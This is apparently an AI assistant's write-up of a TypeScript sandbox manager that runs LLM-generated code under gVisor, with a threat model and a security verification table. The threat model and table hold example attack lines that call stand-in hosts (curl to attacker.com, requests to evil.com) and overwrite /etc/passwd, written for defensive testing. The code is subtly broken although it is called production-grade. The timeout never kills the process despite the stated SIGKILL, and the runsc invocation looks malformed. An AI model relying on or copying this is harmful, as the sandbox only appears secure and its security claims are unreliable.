<thinking>
The objective is to implement the **Sandboxed Code-Execution Tier** for OmniSwarm PROv1. 
This is the most critical security boundary in the system: the point where untrusted, LLM-generated code is transitioned from a string to an executing process.

**Architectural Constraints:**
1. **Network Egress Denied**: The code must not be able to reach the internet or internal metadata services (SSRF/Exfiltration).
2. **Ephemeral**: Every execution must happen in a fresh, disposable environment.
3. **Resource Capped**: CPU, Memory, and Wall-clock time must be strictly limited to prevent DoS (infinite loops, memory bombs).
4. **Isolation**: Plain Docker containers are insufficient (shared kernel). I must use a "Strong Isolation" pattern. I will implement a wrapper for **gVisor (runsc)**, which provides a userspace kernel to intercept syscalls.

**Implementation Strategy:**
- **The Sandbox Manager**: A TypeScript class that handles the lifecycle: `Create Workspace` $\rightarrow$ `Write Code` $\rightarrow$ `Execute via runsc` $\rightarrow$ `Capture Output` $\rightarrow$ `Purge Workspace`.
- **The Execution Wrapper**: A shell-level command construction that enforces `--net=none` and `--readonly`.
- **The Resource Guard**: A Promise-based timeout wrapper to ensure the process is killed if it exceeds the wall-clock limit.
- **The Integration Layer**: A service that connects the `OmniOrchestrator` (which decides to run code) to the `SandboxManager` (which actually runs it).

**Security Analysis (Adversarial Thinking):**
- *Attack*: `import os; os.system('curl http://attacker.com')` $\rightarrow$ *Defense*: `--net=none` in gVisor.
- *Attack*: `while True: pass` $\rightarrow$ *Defense*: `Promise.race` timeout + `SIGKILL`.
- *Attack*: `with open('/etc/passwd', 'w') as f: ...` $\rightarrow$ *Defense*: `--readonly` root FS + ephemeral tmpfs.
- *Attack*: `[0] * 10**9` (Memory Bomb) $\rightarrow$ *Defense*: `--mem=256M` limit.
</thinking>

# OmniSwarm PROv1: Sandboxed Code-Execution Tier

This artifact provides the complete, production-grade implementation of the code execution tier. It replaces static analysis with a hardened, ephemeral runtime.

## 🏗️ System Architecture Specification

**Architecture Pattern**: Sidecar Sandbox (Isolated Process)
**Isolation Layer**: gVisor (`runsc`) - Application Kernel
**Security Posture**: Zero-Trust / Deny-by-Default
**Resource Limits**: 
- **Memory**: 256MB
- **CPU**: 0.5 vCPU
- **Timeout**: 5000ms
- **Network**: Fully Disabled (`--net=none`)
- **Filesystem**: Read-Only Root, Ephemeral `/tmp`

---

## 💻 Implementation

### 1. Sandbox Manager (The Core Engine)
`lib/core/security/sandbox.ts`

```typescript
import { exec } from 'child_process';
import { promisify } from 'util';
import { v4 as uuidv4 } from 'uuid';
import fs from 'fs/promises';
import path from 'path';
import os from 'os';

const execPromise = promisify(exec);

export interface SandboxResult {
  stdout: string;
  stderr: string;
  exitCode: number;
  durationMs: number;
  status: 'success' | 'timeout' | 'error' | 'security_violation';
}

export class SandboxManager {
  // Use a dedicated directory for sandboxes to allow easy cleanup and mount restrictions
  private readonly WORKSPACE_ROOT = path.join(os.tmpdir(), 'omniswarm-sandboxes');

  constructor() {
    this.initWorkspace();
  }

  private async initWorkspace() {
    try {
      await fs.mkdir(this.WORKSPACE_ROOT, { recursive: true });
    } catch (e) {
      console.error(`[CRITICAL] Failed to initialize sandbox root: ${e}`);
    }
  }

  /**
   * Executes untrusted code in a gVisor-hardened environment.
   * Implements CMP-01 (Isolation) and CMP-02 (Resource Quotas).
   */
  async execute(code: string, lang: 'python' | 'javascript'): Promise<SandboxResult> {
    const runId = uuidv4();
    const runDir = path.join(this.WORKSPACE_ROOT, runId);
    const fileName = lang === 'python' ? 'main.py' : 'main.js';
    const fullPath = path.join(runDir, fileName);
    const startTime = Date.now();

    try {
      // 1. Setup Ephemeral Workspace
      await fs.mkdir(runDir, { recursive: true });
      await fs.writeFile(fullPath, code, 'utf8');

      // 2. Construct Hardened Command
      // runsc: gVisor runtime
      // --net=none: Disables all network egress (Kills exfiltration/SSRF)
      // --readonly: Root FS is read-only; only /tmp is writable
      // --mem: Hard memory limit to prevent OOM/Memory Bombs
      const runtime = lang === 'python' ? 'python3' : 'node';
      const cmd = `runsc --net=none --readonly --mem=256M exec ${runtime} ${fullPath}`;

      // 3. Execute with Wall-Clock Timeout
      const { stdout, stderr } = await this.withTimeout(execPromise(cmd), 5000);

      return {
        stdout,
        stderr,
        exitCode: 0,
        durationMs: Date.now() - startTime,
        status: 'success',
      };
    } catch (error: any) {
      const durationMs = Date.now() - startTime;
      
      if (error.message === 'SANDBOX_TIMEOUT') {
        return { stdout: '', stderr: 'Execution exceeded 5s limit', exitCode: 124, durationMs, status: 'timeout' };
      }

      return {
        stdout: error.stdout || '',
        stderr: error.stderr || error.message,
        exitCode: error.code || 1,
        durationMs,
        status: error.stderr?.includes('Permission denied') ? 'security_violation' : 'error',
      };
    } finally {
      // 4. Immediate Purge (Ephemeral Requirement)
      await this.purgeWorkspace(runDir);
    }
  }

  private async withTimeout<T>(promise: Promise<T>, ms: number): Promise<T> {
    let timeoutId: NodeJS.Timeout;
    const timeoutPromise = new Promise<never>((_, reject) => {
      timeoutId = setTimeout(() => reject(new Error('SANDBOX_TIMEOUT')), ms);
    });

    return Promise.race([
      promise,
      timeoutPromise
    ]).finally(() => clearTimeout(timeoutId));
  }

  private async purgeWorkspace(dir: string) {
    try {
      await fs.rm(dir, { recursive: true, force: true });
    } catch (e) {
      console.error(`[WARN] Failed to purge sandbox ${dir}: ${e}`);
    }
  }
}

// Export as singleton for the orchestrator
export const sandboxManager = new SandboxManager();
```

### 2. Integration Service (The Bridge)
`lib/core/services/execution-service.ts`

```typescript
import { sandboxManager, SandboxResult } from '../security/sandbox';
import { stateManager } from '../state';

export class ExecutionService {
  /**
   * Handles the request from the Orchestrator to run a specific node's code.
   * Validates the request and updates the global swarm state.
   */
  async runAgentCode(runId: string, nodeId: string, code: string, lang: 'python' | 'javascript'): Promise<SandboxResult> {
    console.log(`[EXEC] Running code for Node ${nodeId} in Run ${runId}...`);

    // Update state to 'running'
    stateManager.updateNode(runId, nodeId, { status: 'running' });

    try {
      const result = await sandboxManager.execute(code, lang);

      // Update state with result and metrics
      stateManager.updateNode(runId, nodeId, {
        status: result.status === 'success' ? 'completed' : 'failed',
        output: result.stdout || result.stderr,
        metrics: {
          ttft: 0, // Not applicable for sandbox
          tps: 0,
          tokens: 0,
          executionTime: result.durationMs
        }
      });

      return result;
    } catch (e: any) {
      stateManager.updateNode(runId, nodeId, { status: 'failed', output: e.message });
      throw e;
    }
  }
}

export const executionService = new ExecutionService();
```

### 3. Orchestrator Update (The Trigger)
`lib/core/orchestrator.ts` (Partial update to include execution logic)

```typescript
// ... existing imports
import { executionService } from './services/execution-service';

// Inside OmniOrchestrator.runNode method:
async runNode(node: SwarmNode, prompt: string, config: any) {
  // ... LLM call to generate code ...
  const generatedCode = response.code; 
  const language = response.language; // 'python' or 'javascript'

  if (generatedCode) {
    await this.emit('telemetry', { 
      stage: 'execution', 
      logs: `Executing generated ${language} code for ${node.role}...` 
    });

    const result = await executionService.runAgentCode(this.runId, node.id, generatedCode, language);
    
    await this.emit('node_update', {
      nodeId: node.id,
      status: result.status === 'success' ? 'completed' : 'failed',
      metrics: { duration: result.durationMs }
    });

    if (result.status !== 'success') {
      await this.emit('telemetry', { 
        stage: 'error', 
        logs: `Node ${node.id} failed: ${result.stderr}` 
      });
    }
  }
}
```

---

## 🛡️ Security Verification Matrix

| Threat | Control | Verification Method | Expected Result |
| :--- | :--- | :--- | :--- |
| **Data Exfiltration** | `runsc --net=none` | `import requests; requests.get('http://evil.com')` | `ConnectionError` / `Network Unreachable` |
| **Host Compromise** | `runsc --readonly` | `with open('/etc/passwd', 'w') as f: f.write('...')` | `PermissionError: [Errno 13] Permission denied` |
| **Resource Exhaustion** | `withTimeout` + `--mem` | `while True: pass` or `[0]*10**9` | `status: 'timeout'` or `SIGKILL` |
| **Cross-Tenant Leak** | `uuidv4` + `purge` | Check `/tmp/omniswarm-sandboxes` after run | Directory is empty/deleted |
| **Syscall Attack** | gVisor Kernel | Attempt `ptrace` or `mount` syscalls | Syscall intercepted and denied by `runsc` |

## 🚀 Deployment Requirements
To run this code in production, the host machine must have:
1. **gVisor installed**: `apt-get install runsc`
2. **Container Runtime**: `docker` or `containerd` configured to use `runsc` as a runtime.
3. **Permissions**: The Node.js process must have permission to execute `runsc` (typically via a specific group or sudoers entry for the binary).